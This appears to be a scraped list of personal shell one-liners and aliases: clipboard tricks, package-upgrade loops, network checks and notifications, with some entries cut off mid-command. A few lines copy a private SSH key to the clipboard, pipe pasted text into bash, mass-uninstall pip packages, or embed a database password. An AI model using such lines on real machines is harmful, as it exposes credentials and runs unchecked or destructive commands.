"printf ""%s-by: Joey Pabalinas <joeypabalinas@gmail.com>\n"" Acked Co-developed Reported Reviewed Signed-off Suggested Tested | xclip -i -f -sel prim | xclip -i -f -sel clip"
"printf ""%s"" $(pwgen -s 20 1) | tee >(pbcopy) | cat; echo"
"printf ""%q\n"" ""$(pwd)"" | pbcopy | echo pwd copied to clipboard"
"printf ""![YES]($(curl -s http://yesno.wtf/api\?force\=yes | jq -c -M -r .image ))"" | xclip -selection clipboard"
"printf ""![NO]($(curl -s http://yesno.wtf/api\?force\=no | jq -c -M -r .image ))"" | xclip -selection clipboard"
"printenv | sort | grep -v -E ""^__\w"""
"printenv | grep ""SHLVL"" | grep -o ""[0-9]"""
"print -z $(fc -l 1 | fzf +s --tac | $SED -re ""s/^\s*[0-9]+\s*//"")"
"print ""Inbox"";aws s3 ls s3://hixme-batch-process-datasets-315363678205-us-west-2/input/ --summarize | Rg Total\ Objects;print ""Outbox"";aws s3 ls s3://hixme-batch-process-datasets-315363678205-us-west-2/output/ --summarize | Rg Total\ Objects;"
"powershell -command ""ps | head -3 ; ps |grep $*"" "
"popd +$( dirs -v | ""$FuzzyFinder"" | grep -o ""[[:digit:]]"") > /dev/null"
"pmset -g log | egrep ""Sleep state|Wake from"""
"pmset -g batt | egrep ""([0-9]+\%).*"" -o --colour=auto | cut -f1 -d"";"""
"pm list packages -f | cut -f 2 -d ""="" | sort"
"play -n synth 0.1 sin 880 || echo -e ""\a"""
"pkill mcomix > /dev/null && echo ""Done!"" || echo ""Problemo!"""
"pkill -9 ""gdb|xstg|fsim"" && fg ; stty sane"
"pip3-check | awk ""\$0=\$1"" | xargs -I{} -- pip3 install --user -U ""{}"""
"pip3 list -o | cut -f 1 -d "" "" | xargs -n 1 pip3 install --upgrade"
"pip3 list -o 2>/dev/null|cut -d""("" -f1|xargs pip3 install -U"
"pip3 list --outdated|cut -d "" "" -f 1|sudo xargs -n1 pip3 install -U"
"pip3 list --outdated | cut -d ""("" -f 1 | xargs -n1 sudo pip3 install --upgrade"
"pip2 list --outdated | cut -d ""("" -f 1 | xargs -n1 sudo pip2 install --upgrade"
"pip list | grep -Po ""^[A-Za-z0-9\-]+"" | xargs sudo -H pip install --upgrade"
"pip list | cut -d "" "" -f 1 | xargs pip install --upgrade"
"pip list -o 2>/dev/null|cut -d""("" -f1|xargs pip install -U"
"pip list -o --format=freeze | sed ""s/==.*//"" | xargs pip install --upgrade"
"pip list --outdated|cut -d "" "" -f 1|sudo xargs -n1 pip install -U"
"pip list --outdated | sed ""s/(.*//g"" | xargs pip install -U"
"pip list --outdated --format=freeze | cut -d = -f 1 |\
"pip install --user -U $(pip freeze | sed ""s/=.*//"" | paste -sd "" "")"
"pip freeze | grep git | sed -E """
"pip freeze | grep -v ""pkg-resources==0.0.0"" | grep -v ""ubuntu-drivers-common==0.0.0"""
"pip freeze | grep -v ""^-e"" | xargs pip uninstall -y"
"ping -w 3 google.com > /dev/null && echo -e ""[ \e[0;32mOK\e[0;0m ]"" || echo -e ""[ \e[0;31mKO\e[0;0m ]"""
"ping -i 5 `route -n get default | grep gateway | cut -d "":"" -f2-`"
"ping -c 1 google.com | grep ""bytes from"" | cut -d = -f 4"
"ping -c 1 `hostname` | head -n 1 | grep -Eo ""([0-9]+\.){3}[0-9]+"""
"ping -c 1 8.8.8.8 && echo "":)"" || echo "":("""
"ping $(netstat --inet -rn|grep ^0.0.0.0|awk ""{print \$2}"")"
"ping $(\ip route show default | head -1 | sed -nE ""s:^.* via ([.:0-9]*) .*$:\1:p"") # ping next hop"
"physlock -ms -p ""$(fortune | cowthink -s | lolcat -)"" > /dev/null 2>&1"
"pgrep skype >/dev/null || rsync --exclude-from /home/andy/files/etc/syncmac-excludes.txt -auvPz macadamia.milky.org.uk:{bin,files,mail,.gnupg,.centerim,.dates,.Skype*,.local} ~"
"pgrep firefox || time $(which find) ~/.mozilla/firefox/ -name ""*sqlite"" -ls -exec sqlite3 -echo {} vacuum \;"
"pgrep firefox || $(which find) ~/""Library/Application Support/Firefox"" -name ""*sqlite"" -ls -exec sqlite3 {} vacuum \;"
"pgrep -x dd && pkill -SIGUSR1 dd || echo ""dd is not running!"""
"pgrep -q vpnc && echo ""Running"" || echo ""OFFLINE"""
"pgrep -f ""postgres: \w+ \w+ .*((\d+)|\[local\])"" | head -1"
"pfd | tr -d ""\n"" | pbcopy"
"perl-rename 's/.*?(sd)?([a-zA-Z]+)-?(\d{3,})(?(?=(HD|FHD))(HD|FHD))([A-Z]?).*(\.\S+$)/\2-\3\6\7/'"
"perl -wle ""print qq|\cO|"""
"perl -pe s@\""\}@@g | perl -pe s@\\\\/@/@g | grep -i -o -P ""http://[^\s\\\\\""]+"""
"perl -nE ""INIT {print q~git > ~} exit if (/^(\\\\q|exit|quit)\$/i); system qq~git \$_~; print q~git > ~"""
"perl -e 'printf qq|%o|, int( shift )'"
"perl -e 'printf qq|%o|, hex( shift )'"
"perl -e 'printf qq|%o\n|, int( shift )'"
"perl -e 'printf qq|%o\n|, hex( shift )'"
"perl -e 'printf qq|%o$/|, int(shift)'"
"perl -e 'printf qq|%o$/|, hex(shift)'"
"perl -e 'printf qq|%d|, oct( shift )'"
"perl -e 'printf qq|%d|, hex( shift )'"
"perl -e 'printf qq|%d\n|, oct( shift )'"
"perl -e 'printf qq|%d\n|, hex( shift )'"
"perl -e 'printf qq|%d$/|, oct(shift)'"
"perl -e 'printf qq|%d$/|, hex(shift)'"
"perl -e 'printf qq|%b|, oct( shift )'"
"perl -e 'printf qq|%b|, int( shift )'"
"perl -e 'printf qq|%b|, hex( shift )'"
"perl -e 'printf qq|%b\n|, oct( shift )'"
"perl -e 'printf qq|%b\n|, int( shift )'"
"perl -e 'printf qq|%b\n|, hex( shift )'"
"perl -e 'printf qq|%b$/|, oct(shift)'"
"perl -e 'printf qq|%b$/|, int(shift)'"
"perl -e 'printf qq|%b$/|, hex(shift)'"
"perl -e 'printf qq|%X|, oct( shift )'"
"perl -e 'printf qq|%X|, int( shift )'"
"perl -e 'printf qq|%X\n|, oct( shift )'"
"perl -e 'printf qq|%X\n|, int( shift )'"
"perl -e 'printf qq|%X$/|, oct(shift)'"
"perl -e 'printf qq|%X$/|, int(shift)'"
"perl -e ""printf qq|%d\n|, hex(shift)"""
"perl -e ""printf qq|%X\n|, int(shift)"""
"perl -MExtUtils::Install -MExtUtils::Installed -e ""unshift@ARGV,new ExtUtils::Installed;sub a{\@ARGV};uninstall((eval{a->[0]->packlist(a->[1])}||do{require CPAN;a->[0]->packlist(CPAN::Shell->expandany(a->[1])->distribution->base_id=~m/(.*)-[^-]+$/)})->packlist_file,1,a->[2])"""
"perl -MEncode -ne 'print encode_utf8(encode_utf8(eval { decode_utf8(\$_) } || decode(q{cp-1252}, \$_)))'"
"pcpes ""$(pqenb)"" | paste - - | sort -n"
"pcap=~/.pcaps/tcpdump-$(nn).pcapng; tshark --capture-comment """" -qwnlpFpcapng -qwn -w - -i any | tee $pcap | tshark -t a --color -r -"
"pbsnodes|grep ""state = free""|wc"
"pbpaste| sed 's/\\\\/ /g' | awk BEGIN{RS=EOF}'{gsub(/\\n/,\"
"pbpaste | tr \\n "" "" | pbcopy"
"pbpaste | tr -d ""\n"" | pbcopy"
"pbpaste | sed -E ""s/\(hail\#([0-9]+)\)/(\[#\1](https:\/\/github.com\/hail-is\/hail\/pull\/\1))/g"" | pbcopy"
"pbpaste | sed ""s/^/ /"" | pbcopy"
"pbpaste | ruby -pe '\$_.gsub!(/\r\n|\r/, \"
"pbpaste | python3 -c ""import sys; from urllib import parse ; print(parse.unquote(sys.stdin.readline()))"" | pbcopy"
"pbpaste | pygmentize -g -f rtf -O 'fontface=Monaco,style=tango' | pbcopy"
"pbpaste | highlight --out-format rtf --font-size 24 --font Menlo --plug-in ""$HIGHLIGHT_DIR/rspec.lua"" --config-file ""$HIGHLIGHT_DIR/twilight.theme"" --style twilight --src-lang ruby | pbcopy"
"pbpaste | grep -v ""^$"" | pbcopy"
"pbpaste | grep ""^buildozer"" | bash"
"pb && open ""https://github.com/owsy/$(basename $PWD)/compare/$(/opt/local/bin/git branch | grep \* | awk "
"paste -d ""\n"" <(ip a | grep ""^[1-9]:"") <(ip a | grep inet)"
"pass usb | e4crypt add_key | grep -v ""passphrase"""
"pass show encrypted-dir | head -n 1 | encfs -S ~/Drive/Encrypted ~/Encrypted && xdg-open Encrypted/giftcards/reselling.ods && echo ""Press enter to unmount volume"" && read _ && sudo umount ~/Encrypted"
"pacmd list-sink-inputs | grep -e ""media.name"" -e spec; pacmd list-sinks | grep -e device.description -e spec"
"pacman -Slq | fzf -m --preview ""pacman -Si {}"" | xargs -r sudo pacman -S --noconfirm"
"pacman -Sl | sed ""s/^[^ ]* //"" | grep"
"pacman -R $(comm -23 <(pacman -Qq | sort) <((for i in $(pacman -Qqg base); do pactree -ul ""$i""; done) | sort -u))"
"pacman -Quq|xargs expac -SH M ""%k\t%n"" | sort -sh"
"pacman -Qlq bsd-games | grep -P ""bin/.+"" | xargs -n1 basename"
"pacman -Qi | awk '/^Name/{name=$3} /^Installed Size/{print $4$5, name}' | sort -h"
"pacman -Qi | awk '/^Name/ {pkg=\$3} /Size/ {print \$4\$5,pkg}' | sort -n"
"pacman -Qi | awk '/^Name/ {pkg=$3} /Size/ {print $4$5,pkg}' | sort -n"
"pacman -Qi | awk ""/^Name/{name=$3} /^Installed Size/{print $4$5, name}"" | sort -h"
"pacman -Qet | grep -v ""^xorg"" | grep -v ""^xfce"""
"pacman -Qei $(pacman -Qu|cut -d"" "" -f 1)|awk "" BEGIN {FS=\"":\""}/^Name/{printf(\""\033[1;36m%s\033[1;37m\"", \$2)}/^Description/{print \$2}"""
"pacman -Q | grep -v grep | grep ""$@"""
"pacman -Q | grep -v grep | grep ""$@"" -i --color=auto"
"p4 diff -f `p4 status -m |cut -d"" "" -f1 |fzf"
"p4 client -o | grep -v ""\-//"" | grep -o ""//\S*\.\.\. """
"otree -aI ""__pycache__|.git|build"""
"osascript -e ""display notification \""$(history|tail -n1|sed -Ee "
"osascript -e ""display notification \""$(history|tail -n1|sed -E "
"opkg update && opkg list-upgradable | cut -f 1 -d "" "" | xargs -r opkg upgrade"
"opkg list-upgradable | cut -f 1 -d "" "" | xargs opkg upgrade"
"openssl s_client -connect smtp.gmail.com:587 -showcerts < /dev/null | sed -n '/-BEGIN /,/-END /p' | sudo sh -c 'cat > ~/.ssl/relayhost.pem'"
"openssl rand -base64 29 | tr -d ""=+/"" | cut -c1-32"
"open https://github.$(git config remote.origin.url | cut -f2 -d. | tr "":"" /)"
"open https://$(git config remote.origin.url | cut -f2 -d@ | tr "":"" /)"
"open https://$(ghq list | peco | sed -e ""s/:10022//g"")"
"open \`git config -l | grep 'remote.origin.url' | sed -En \
"open -a sourcetree ""$(git rev-parse --show-toplevel || echo ""."")"""
"open -a pycharm ""$(git rev-parse --show-toplevel || echo ""."")"""
"open $(git remote get-url origin | sed -e ""s/ssh:\/\/git@/https:\/\//g"" | sed -e ""s/\.git//g"")"
"open $(git push --set-upstream origin $(git_current_branch) 2>&1 | grep -Eo ""(http|https)://[a-zA-Z0-9./?=_-]*"")"
"open $(git config remote.origin.url | sed ""s/git@\(.*\):\(.*\).git/https:\/\/\1\/\2/"" | sed ""s/github.com-ekweible/github.com/"")/tree/$(git symbolic-ref --quiet --short HEAD)"
"open $(ghq list |fzf | awk -F ""/"" "
"open ""mailto:?body=$(cat - | stripansi | urlencode)"""
"open ""https://github.com:/$(git remote -v | /usr/bin/grep -oP ""(?<=git@github.com:).+(?=\.git)"" | head -n 1)/pulls"""
"open ""http://127.0.0.1:$((docker start db pma && docker port pma) | tail -n1 | cut -d "":"" -f 2)"""
"open ""`ls -t | grep .epub | head -1`"""
"obxprop | grep ""WM_WINDOW_ROLE\|WM_CLASS"" && echo ""WM_CLASS(STRING) = \""NAME\"", \""CLASS\"""""
"nvim `git diff -r HEAD^1 | grep ""+++ b"" | sed -e ""s/+++ b.//""`"
"nvim --api-info | python2 -c ""import msgpack, sys, yaml; print yaml.dump(msgpack.unpackb(sys.stdin.read()))"" | less"
"nvim $(rgs . | selecta | cut -d"":"" -f 1)"
"nvim $(ls ~/.dotfiles/help/ | f --prompt ""❓ "" | xargs -I % echo ~/.dotfiles/help/%)"
"nvim $( history | sed -n ""s/^ *[0-9][0-9]* *vim *\(.*\)/\1/p"" | tail -1 )"
"nvidia-smi --format=csv,noheader --query-gpu=temperature.gpu,fan.speed | sed -e 's/^\([0-9]\+\), \([0-9]\+\) %$/GPU: \t\1\xc2\xb0C, FAN: \2%/'; sensors | sed -e's/^Core \([0-9]\)[^(]*+\([0-9]\+\)\..*$/Core\1: \t\2\xc2\xb0C/p' -e'd'"
"nvidia-settings -q gpucoretemp | grep -oP "": \d+"" | cut -d"" "" -f2"
"nvidia-settings -q "":0/GPUUtilization[gpu:0]"" | grep -oP ""graphics=\d+"" | cut -d= -f2"
"nspec $(gst -s | grep ""_spec.rb"" | sed ""s/. \(.*_spec.rb\)/\1/g"")"
"npm start 2>&1 | h -ni ""failed|warning disconnected connecting port Authentication better-npm-run http://localhost:8080/graphql http://"""
"npm run unit -- --grep `head -1 tests.txt` 2>&1 | grep -vE ""(Coverage for |npm ERR\\!)"""
"npm run $(show-npm-scripts | peco | cut -f 1 -d "" "")"
"npm ls -g | grep -v ""│\| """
"npm info ""eslint-config-airbnb@latest"" peerDependencies --json | command sed ""s/[\{\},]//g ; s/: /@/g"" | xargs npm install --save-dev ""eslint-config-airbnb@latest"""
"npm info ""eslint-config-airbnb-base@latest"" peerDependencies --json | command sed ""s/[\{\},]//g ; s/: /@/g"" | xargs npm install --save-dev ""eslint-config-airbnb-base@latest"""
"notify-send -t 0 -i gnome-terminal ""[$?] $(history|tail -n1|sed -e "
"notify-send -i urxvt ""[$?] $(history|tail -n1|sed -e "
"notify-send -i gnome-terminal ""[$?] $(history|tail -n1|sed -e ""s/^\s*[0-9]\+\s*//;s/;\s*gyr-alert-sh$//"")"""
"notify-send -i gnome-terminal ""[$?] $(history|tail -n1|sed -e "
"notify-send -i gnome-terminal ""[$?] $(history|tail -n1|sed
"notify-send -i face-cool -u low ""Job Done!!!"" || notify-send -i face-crying -u critical ""Job FAILED :("""
"notify-send -i /usr/share/icons/gnome/32x32/apps/gnome-terminal.png ""[$?] $(history|tail -n1|sed -e "
"notify-send -i ""$([[ $? == 0 ]] && echo terminal || echo error)"" "
"notify-send --urgency=low -i ""$(if [[ $? == 0 ]]; then echo ""terminal""; else echo ""error""; fi)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)""\
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"""
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" \
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(print -Pn ""Process on %y finished\n${curcmd}"")""; echo \\a"
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(histo$
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)""
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || ech$
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || \
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal ||
"notify-send --urgency=low -i ""$([ $? -eq 0 ] && echo terminal || echo error)"""
"notify-send --urgency=critical -t 10000 ""$(history|tail -n1|sed -e "
"notify-send --urgency=critical -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""command finished"""
"notify-send --urgency=critical -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""${1:-End of Execution}"""
"notify-send ""Operation finished"" || notify-send ""Error on Operation"""
"notify-send ""Long process end successfully"" || notify-send -u critical ""ERROR ON LONG PROCESS"""
"nohup showdown $(ls ~/.dotfiles/help/ | f --prompt ""❓ "" | xargs -I % echo ~/.dotfiles/help/%) > /dev/null &! exit"
"nohup $1 >${LOG}/${1}.`date ""+%b-%d-%H-%M-%S""`.out || echo -e ""\a"""
"node --eval ""require(\""gify\"")(process.argv[2], process.argv[3] || \""out.gif\"")"""
"no -Q0 | sed ""s#SELECTED.*NAME.*ALIAS# #; s#\(.*\) \[SUM of.*#$RTLISTSUMMSGPUBLIC: \1#"" | grep -v -e 'MIN of' -e 'MAX of' -e 'AVG of'"
"nmcli -t -f active,ssid dev wifi | egrep '^yes' | cut -d\' -f2"
"nmap -sP `myip`/24 | grep report | awk "" { print \$5 } """
"networksetup -listallnetworkservices 2>/dev/null | grep -v ""*"" | while read x; do; networksetup -setdnsservers ""$x"" empty; done"
"networksetup -listallnetworkservices 2>/dev/null | grep -v ""*"" | while read x; do; networksetup -setdnsservers ""$x"" 127.0.0.1; done"
"networksetup -listallnetworkservices 2>/dev/null | grep -v ""*"" | while read x; do; networksetup -setdnsservers ""$x"" 1.1.1.1 1.0.0.1 2606:4700:4700::1111 2606:4700:4700::1001; done"
"netstat -rn -f inet|grep default|awk ""{print \$2}"""
"netstat -npl | grep -vE ""^unix"" | grep ""LISTEN"""
"netstat -na -ptcp | grep ESTAB |egrep -v ""(127.0.0.1.*127.0.0.1)"""
"netstat -lnp | grep "" LISTEN "" | grep -v ""tcp6"""
"netstat -laputen| grep -v $LHOST| grep -v ""chocolatine ;#"""
"netstat -alnp --protocol=inet | grep -v CLOSE_WAIT | cut -c-6,21-94 "
"netstat -alnp --protocol=inet | grep -v CLOSE_WAIT | cut
"netstat -a | egrep ""Proto|LISTEN"""
"netctl stop $(netctl list | grep \* | cut -d "" "" -f2)"
"netctl restart $(netctl list | grep \* | cut -d "" "" -f2)"
"net stats srv | sed -n 4p | cut -d "" "" -f 3-4"
"nc 4.ifcfg.me 23 | grep IPv4 | cut -d"" "" -f4"
"nautilus ""$(find -L ~/Dropbox ~/Documents ~/Videos -type d 2> /dev/null | grep -v ""/\."" | dmenu -i -l 10)"" &>/dev/null"
"mysql --pager=""less -SFX"" -uroot -pnova -h $(ifconfig lo0 | grep ""inet "" | aw 2)"
"mysql --login-path=prod -e ""show engine innodb status"" | perl -ple ""s/\\\\n/\\n/g"" | mvim -"
"my_file=$(find /usr/include -type f | sort -R | head -n 1); my_len=$(wc -l <$my_file); let ""r = $RANDOM % $my_len"" 2>/dev/null; vim +$r $my_file"
"mvn dependency:tree -Dincludes=""com.nuance.escription.*"" | egrep -e ""INFO\]\ [c+|\]"""
"mvn clean install -t 4 && notify-send ""build and tests done quickly"" || notify-send ""build or tests quickly failed"""
"mvn clean install -U -Dgpg.skip=true -P Atnv2_Local,gwt-dev,resources-dev -DskipTests 2>&1 | h -i error info warn debug caused atnv2 downloading building | h -ni filmcoderelease film"
"mvn clean install -DskipTests -t 4 && notify-send ""build done quickly"" || notify-send ""build failed quickly"""
"mvn clean install -DskipTests && notify-send ""build done"" || notify-send ""build failed"""
"mvn clean install && notify-send ""build and tests done"" || notify-send ""build or tests failed"""
"mvn -f $(git rev-parse --show-toplevel 2>/dev/null || echo ""."")/pom.xml"
"mvn --fail-at-end -B -T 2.0C -DskipTests -P -reports clean install ; notify-send -u low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""Maven build"" finished"
"mvim -U ~/.gvimrc.fullscreen -p *.h -c ""set splitright | tabdo vsp %<.c | windo set nowrap"""
"mv -t ./ ~/HW1/usr/toukmond/*.o >& ~/_ && echo ""You drop all your items."" || echo ""You have nothing to drop."" ; find key.o >& ~/_ && chmod a-x ~/HW1/rooms/old-building-hallway >& ~/_ ; find bear.o food.o >& ~/_ && rm food.o bear.o >& ~/_ && mv -t . ~/HW1/.blocked/key.o 2> ~/_ && echo ""The bear takes the food and runs away with it. He left something behind."" ; ig"
"mv *[!r].o ~/HW1/usr/toukmond >& /dev/null && echo ""You pick up everything that you can."" || echo ""There is nothing here that you can get.""; ls ~/HW1/usr/toukmond/key.o >& /dev/null && chmod a+x ~/HW1/rooms/old-building-hallway"
"mux $(ls ~/.tmuxinator | cut -f 1 -d ""."" | fzf)"
"mr -d ""$(find_up .mrconfig || echo .)"""
"mpv --af=""pan=stereo|FL=FC+0.30*FL+0.30*FLC+0.30*BL+0.30*SL+0.60*LFE|FR=FC+0.30*FR+0.30*FRC+0.30*BR+0.30*SR+0.60*LFE,loudnorm"""
"mpv --af=""pan=stereo|FL=FC+0.30*FL+0.30*FLC+0.30*BL+0.30*SL+0.60*LFE|FR=FC+0.30*FR+0.30*FRC+0.30*BR+0.30*SR+0.60*LFE"""
"mplayer -quiet -cache-min 20 -audiofile-cache 50000 -novideo -playlist <(curl http://mtgcast.com/topics/mtgcast-podcast-shows/active-podcast-shows/bump-in-the-night-with-dj-spruke/feed -s | grep mp3 | sed -e ""s/.*\(http[^\""]*\).*/\1/"")"
"mpc clear; mpc search album ""$(mpc list album | gshuf -n1)"" | mpc add && mpc play && clear"
"mpc -f ""%artist% %title%"" | head -1 | xclip -i -selection clipboard"
"mozcapag ""tail -F /movile/mozca_system_log/*.log"" | grep "" Delay"" | grep VERIFY --color"
"mount | grep ""sd[b-z]\|mapper"""
"mount | cut -d' ' -f 1,3,5,6 | grc column -t"
"mount -o remount,rw / ; fs_mode=\$(mount | sed -n -e ""s/^.* on \/ .*(\(r[w|o]\).*/\1/p"")"
"mount -o remount,ro / ; fs_mode=\$(mount | sed -n -e ""s/^.* on \/ .*(\(r[w|o]\).*/\1/p"")"
"mosh --server=/usr/local/bin/mosh-server silverfish ""tmux attach || tmux new"""
"mosh $(grep -iE ""^host[[:space:]]+[^*]"" ~/.ssh/config|peco|awk ""{print \$2}"")"
"more ~/.ssh/id_rsa.pub | xsel -i --clipboard | echo ""=> Public key copied to clipboard"""
"more ~/.ssh/id_rsa.pub | pbcopy | printf ""✓ Public SSH key copied to pasteboard.\n"""
"more ~/.ssh/id_rsa.pub | pbcopy | printf ""=> Public key copied to pasteboard.\n"""
"more ~/.ssh/id_rsa.pub | pbcopy | echo ""=> Public key copied to pasteboard."""
"more ~/.ssh/id_rsa.pub | pbcopy | echo ""=> Public key copied to pasteboard"""
"more ~/.ssh/id_rsa | xsel -i --clipboard | echo ""=> Private key copied to clipboard"""
"more \$1| grep -v $LHOST| grep -v ""chocolatine ;#"""
"more Makefile | grep "":"" | awk -F"":"" "
"more $HOME/.bashrc | grep alias* | cut -d"" "" -f2- -s"
"mkdir -p $HOME/Dropbox/Workspace/journal/$(date +%Y)/$(date +%m); test -f /usr/bin/code && edit=""code"" || edit=""vim""; $edit ""$HOME/Dropbox/Workspace/journal/$(date +%Y)/$(date +%m)/journal-$(date +%Y-%m-%d).md"""
"mkdir -p $HOME/.hse_history ; FNAME=`date +%Y_%m_%d` ; echo ""`date +%H:%M:%S` |`history 1|sed -e ""s/^[^0-9]*[0-9]*//g""`"" >> $HOME/.hse_history/""$USER""_""$FNAME"""
"mix help | grep -E ""phx|phoenix"""
"mdfind ~ | fzf --bind ""space:execute(qlmanage -p {})"" | xargs open"
"md $(ls ~/.dotfiles/help/ | f --prompt ""❓ "" | xargs -I % echo ~/.dotfiles/help/%)"
"man bash|col -xb|awk -F"" +"" ""{if (\$0 ~ /^ Commands [Ff]/) {p=1}; if (\$0 ~ /^ Prog.*Comp/) {p=0}; if (p) {print $2}}"""
"makefun(){ set -x ; LOG=$PWD/log.$(date +%m%d%H%M%S).txt ; if [ -z ""$*"" ] ; then echo ""target:null"" ; make -j 8 2>&1 | tee ""$LOG"" ; else echo ""target:"" ""$*"" ; bash -c ""make -j 8 $*"" 2>&1 | tee ""$LOG"" ; fi ; set +x } ; makefun"
"make clean > /dev/null ; make -j9 -s AR=""~/code/sh/tools/ar"" > /dev/null || error $HEADER make"
"make -qp | awk -F':' '/^[a-zA-Z0-9][^\$#\/\t=]*:([^=]|$)/ {split(\$1,A,/ /); for(i in A) print A[i]}'"
"make -qp | awk -F"":"" ""/^[a-zA-Z0-9][^$#\/\t=]*:([^=]|$)/ {split(\$1,A,/ /);for(i in A)print A[i]}"""
"maim -d 3 /tmp/$$.png && curl -F c=@/tmp/$$.png https://ptpb.pw/ | tee >(perl -ne ""(s/url: // && chomp && print) if /url: /"" | xsel -ib)"
"mailme ""SUCCESS"" || mailme ""FAILURE"" "
"m wifi status | grep ""^ \+SSID"" | sed -n -e ""s/^.*SSID: *//p"""
"lynx -dump http://checkip.dyndns.org | perl -ne 'print /((?:\d{1,3}(?:\.|$)){4})/'"
"lynx -dump checkip.dyndns.org | sed ""s/[^0-9]*//"" | fgrep ."
"lynx -dump -hiddenlinks=ignore -nolist http://checkip.dyndns.org:8245/ | awk ""{ print $4 }"" | sed ""/^$/d; s/^[ ]*//g; s/[ ]*$//g"""
"lynx --dump http://weather.noaa.gov/weather/current/UUDD.html | sed -n ""/Temperature/s/[0-9][0-9]\? F (//p; /Humidity/p"" | tr -d "")"""
"lspci | grep ""VGA compatible controller"" && grep -i --color memory /var/log/Xorg.0.log && lspci -v | grep -A 12 VGA && lshw -enable pci -class display && grep /drivers/ /var/log/Xorg.0.log"
"lspci | \egrep -i ""network|ethernet"""
"lspci -k | grep -EA2 ""VGA|3D"""
"lspci -k | grep -A 2 -E ""(VGA|3D)"""
"lsof -inP | cut -f 1 -d "" "" | uniq"
"lsof -i | grep -E ""(LISTEN|ESTABLISHED)"""
"lsof -i | grep -E ""(ESTABLISHED)"" && lsof -i | grep -E ""(LISTEN)"""
"lsof -i -n | egrep ""COMMAND|LISTEN"""
"lsof -i -P -n | grep ""(LISTEN)"" | awk "
"lsof -d DEL | awk ""\$8~/\/usr\/lib/ { print \$NF }"" | sort -u"
"lsof -d DEL +c0 | awk '\$8~/\/usr\/lib/ && !x[\$NF\$1]++ { print \$NF, \$1; }' | column -t"
"lsof -Pni | cut -f1 -d"" "" | sort -u"
"lsof -P -i -n | cut -f 1 -d "" "" |uniq"
"lsof -P -i -n | cut -f 1 -d "" "" | uniq"
"lsf_bjobs -w | command grep ""JOBID\|$$"""
"lsd | cut -c48- | tr ""\n"" "" "" && echo"
"lscpu -p=cpu | grep ""[0-9]"" | parallel sudo cpufreq-set -g performance -c {}"
"lsblk -o name,size,type,mountpoint | grep 'part' | sort -k2 -h"
"lsblk -o name,size,type,mountpoint | egrep '(part|lvm)'"
"lsblk -d -o name,rota | sed s/1/HDD/g | sed s/0/SSD/g"
"lsa | ack ""^d"" | awk ""{print}"""
"lsa | ack ""^d"" | awk ""{print $9}"""
"ls\ -ltr\ $LSPARAMS\ '| grep -v ""^total"" | head'"
"ls\ -ltr\ $LSPARAMS\ '| grep -v ""^total"" | head' "
"ls\ -lt\ $LSPARAMS\ '| grep -v ""^total"" | head'"
"ls\ -lt\ $LSPARAMS\ '| grep -v ""^total"" | head' "
"ls ~/inkspree/inkstone/target | grep standalone | xargs -I {} java -jar ~/inkspree/inkstone/target/""{}"" "
"ls ~/HW1/usr/toukmond/key.o >& /dev/null && chmod a-x ~/HW1/rooms/old-building-hallway ; (mv ~/HW1/usr/toukmond/*.o `pwd` >& /dev/null && echo ""You drop all your items."") || echo ""You have nothing to drop.""; ls bear.o >& /dev/null && ls food.o >& /dev/null && rm -f bear.o food.o && echo ""The bear takes the food and runs away with it. He left something behind."" && mv ~/HW1/.blocked/key.o `pwd`"
"ls ~/.local/share/nvim/swap | grep "".swp"" | xargs -I swap_file rm ~/.local/share/nvim/swap/swap_file"
"ls | while read upName; do loName=`echo ""${upName}"" | tr ""[:upper:]"" ""[:lower:]""`; mv ""$upName"" ""$loName""; done"
"ls | sed -n ""$((RANDOM%$(ls | wc -l)+1))p"""
"ls | sed ""s:^:`pwd`/:"" | sed ""s/^/$HOSTNAME:/g"""
"ls | grep erl | while read line;do echo ""--- compiling $line ---"" && compile $line;done"
"ls | cut -c1-50 | column -c ""${COLUMNS:-80}"""
"ls | cat -n | while read n f; do nn=`printf %02d $n`; ln -s ""$f"" ""$nn.jpg""; done"
"ls urinal >& ~/X|| echo ""You cannot flush here."";ls urinal >& ~/X && (mv ~/pa3/holdtreasure/* ~/pa3/treasures >& ~/X;echo Whoosh\!!;echo ;score) "
"ls urinal >& ~/X || echo ""there being nothing to flush"";ls urinal >& ~/X && (mv ~/holdtreasure/* ~/X;echo ""Whoosh\!\!"";echo ""\n"";score;)"
"ls urinal >& ~/X || echo ""There is no urinal in this room"" ; ls urinal >& ~/X && (mv ~/pa3/holdtreasure/* ~/pa3/treasures >& ~/X ; echo Whoosh !\! && echo -e ""\n"" && score)"
"ls urinal >& ~/X || echo ""There being nothing to flush."" ; ls urinal >& ~/X && (mv ~/pa3/holdtreasure/* ~/pa3/treasures >& ~/X ; echo Whoooosh\!\! ; echo ; score)"
"ls db/migrate/* | tail -n1 | xargs ""vi"""
"ls 978*epub | while read book; do echo $book; metafile=$(unzip -l ""$book"" | grep -Eo "
"ls /var/lib/dpkg/info/adduser.templates /var/lib/dpkg/info/base-passwd.templates /var/lib/dpkg/info/ca-certificates.templates /var/lib/dpkg/info/dash.templates /var/lib/dpkg/info/debconf.templates /var/lib/dpkg/info/dictionaries-common.templates /var/lib/dpkg/info/iamerican.templates /var/lib/dpkg/info/libc6:amd64.templates /var/lib/dpkg/info/libpam-modules:amd64.templates /var/lib/dpkg/info/libpam-runtime.templates /var/lib/dpkg/info/libpam0g:amd64.templates /var/lib/dpkg/info/libpaper1:amd64.templates /var/lib/dpkg/info/libssl1.0.0:amd64.templates /var/lib/dpkg/info/libssl1.1:amd64.templates /var/lib/dpkg/info/nginx-common.templates /var/lib/dpkg/info/ucf.templates /var/lib/dpkg/info/wamerican-insane.templates | xargs -n 1 basename | sed -e ""s/.templates$//"""
"ls /giediprime/Video/Films/._* | cut -d_ -f2 | sed ""s/\.avi.*$//"""
